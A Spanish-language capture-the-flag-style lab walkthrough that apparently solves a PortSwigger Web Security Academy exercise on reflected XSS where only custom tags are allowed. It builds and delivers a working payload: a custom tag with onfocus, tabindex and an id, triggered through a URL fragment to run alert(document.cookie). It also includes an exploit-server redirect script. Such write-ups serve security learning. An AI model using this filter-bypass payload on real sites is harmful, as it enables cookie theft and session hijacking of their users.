# 🌐 XSS reflejado con solo etiquetas personalizadas

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **XSS reflejado** en un entorno extremadamente restrictivo.\
La aplicación bloquea todas las etiquetas HTML estándar y solo permite **etiquetas personalizadas (custom tags)**.

El objetivo es inyectar una etiqueta personalizada que ejecute automáticamente `alert(document.cookie)` sin interacción del usuario.



## 📚 Teoría

### 📌 Funcionamiento de la vulnerabilidad

El flujo vulnerable es el siguiente:

1. El usuario introduce un valor en el buscador.
2. El servidor refleja ese valor directamente en el HTML de la página.
3. Un filtro bloquea todas las etiquetas HTML conocidas.
4. Sin embargo, permite etiquetas personalizadas inventadas por el usuario.

Ejemplo de etiqueta personalizada:

```html
<miEtiqueta>contenido</miEtiqueta>
```

Desde el punto de vista del navegador, estas etiquetas son válidas y pueden contener atributos y manejadores de eventos.

El error de la aplicación es centrarse únicamente en **qué etiquetas se permiten**, sin controlar los **atributos ni los eventos** que pueden utilizarse.

Esto permite crear etiquetas personalizadas que incluyan **event handlers** como `onfocus`, `onclick`, etc.

### 📌 Uso del fragmento de URL para activar eventos

El navegador tiene un comportamiento interesante relacionado con los fragmentos de URL.

Si una URL contiene:

```
#id
```

y en el HTML existe un elemento con ese identificador:

```
id="id"
```

el navegador intentará enfocar automáticamente ese elemento al cargar la página.

Si ese elemento es enfocable y tiene un evento `onfocus`, dicho evento se ejecutará automáticamente.

Esto permite ejecutar JavaScript sin interacción del usuario.



## 📝 Práctica

### 1️⃣ Comprobar que se permiten etiquetas personalizadas

Introducimos en el buscador una etiqueta inventada:

```
<etiqueta>Hola</etiqueta>
```

<figure><img src="../../../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>

Resultado:

La página se renderiza correctamente y el navegador crea el elemento.

Esto confirma que las etiquetas personalizadas están permitidas.



### 2️⃣ Probar eventos en la etiqueta

Intentamos añadir un manejador de eventos:

```html
<etiqueta onfocus=alert(0)>Hola</etiqueta>
```

Resultado:

El evento no se ejecuta automáticamente.

Esto ocurre porque el elemento no puede recibir foco por defecto.



### 3️⃣ Hacer el elemento enfocable

Para que el elemento pueda recibir foco, añadimos el atributo `tabindex`.

Payload:

```html
<etiqueta onfocus=alert(0) tabindex=1>Hola</etiqueta>
```

<figure><img src="../../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1058).png" alt=""><figcaption></figcaption></figure>

Resultado:

El evento `onfocus` funciona si el elemento recibe foco.

Esto confirma que la ejecución de JavaScript es posible.



### 4️⃣ Forzar la ejecución automática

Para provocar el foco automáticamente utilizamos un fragmento de URL.

Primero añadimos un identificador al elemento:

```hlsl
<etiqueta id=x onfocus=alert(document.cookie) tabindex=1>Hola</etiqueta>
```

Cuando la página se carga con el fragmento `#x`, el navegador intentará enfocar ese elemento automáticamente.



### 5️⃣ Intregar el exploit

Utilizamos el Exploit Server del laboratorio para redirigir a la víctima a la URL maliciosa.

Payload:

```html
<script>
location='https://LAB-ID.web-security-academy.net/?search=<etiqueta id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

<figure><img src="../../../.gitbook/assets/image (1059).png" alt=""><figcaption></figcaption></figure>

Funcionamiento del exploit:

1. La víctima carga la página maliciosa.
2. El navegador redirige a la URL vulnerable.
3. El contenido del parámetro `search` se refleja en el HTML.
4. Se crea la etiqueta personalizada con `id=x`.
5. El fragmento `#x` provoca que el navegador enfoque el elemento.
6. Se dispara el evento `onfocus`.
7. Se ejecuta `alert(document.cookie)`.



### 6️⃣ Resultado

Para completar el laboratorio:

1. Guardamos el exploit en el Exploit Server.
2. Seleccionamos la opción **Deliver exploit to victim**.

El navegador ejecuta `alert(document.cookie)` automáticamente y el laboratorio se marca como completado.
